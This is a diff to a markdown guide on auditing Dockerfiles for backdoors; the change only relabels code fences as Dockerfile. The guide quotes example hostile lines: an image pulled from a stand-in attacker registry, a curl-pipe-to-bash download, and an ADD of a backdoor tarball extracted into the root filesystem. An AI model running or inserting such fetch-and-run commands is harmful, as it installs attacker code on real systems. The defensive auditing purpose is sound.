@@ -68,7 +68,7 @@ Although the image started with `FROM debian` it will end up running whatever `F
 
 #### Image with URL as part of name
 One of the things that `docker` will do for you is to parse as URL the image name. This means that the following statement is valid
-```sh
+```Dockerfile
 FROM badregistry.attacker.io/repo/backdoor:latest
 ```
 
@@ -88,7 +88,7 @@ It is here mostly for completeness (or in case i want to research this again in 
 Before i use a container i like to examine the what it runs on build time. I usually trace the all the `RUN` statements from the `Dockerfile`. Check for any out-of-ordinary commands being executed, any downloads that shouldn't be there etc.
 
 I've seen a fair amount of the following attempt to download "backdoored" binaries in `Dockerfiles`.
-```
+```Dockerfile
 RUN curl -sL https://IP/setup_14.x | bash -
 ```
 
@@ -100,7 +100,7 @@ Pay close attention to `COPY` commands and more specificaly the
 
 Remember the multi-stage builds from above? This is where the COPY command may
 come in handy.
-```sh
+```Dockerfile
 FROM debian #index 0
 ...
 FROM redhat #index 1
@@ -117,7 +117,7 @@ Another statement is `ADD` that performs very similar tasks as `COPY` does but
 with a few twists. One of them is the ability to fetch files from the network
 to be added to the image.
 
-```sh
+```Dockerfile
 ADD https://some.bad.site/backdoor.tgz /tmp
 RUN tar zxf /tmp/backdoor.tgz -C /
 ```
@@ -127,7 +127,7 @@ This defines the default command to be passed to the `ENTRYPOINT` when the
 image is run. I make sure the default command looks ok and if it refers to a
 script, i inspect its contents to try and figure out what it does.
 
-```sh
+```Dockerfile
 CMD ["/bin/ba.sh"]
 ```
 
@@ -140,7 +140,7 @@ docker image inspect badimage:lastest|grep -i cmd
 The `ENTRYPOINT` defines the `init` for the image. The command from `CMD` is passed to this.
 
 I always inspect the `ENTRYPOINT` entries and their contents.
-```sh
+```Dockerfile
 ENTRYPOINT ["/something-that-looks-or-has-suspicious-contents.sh"]
 ```
 
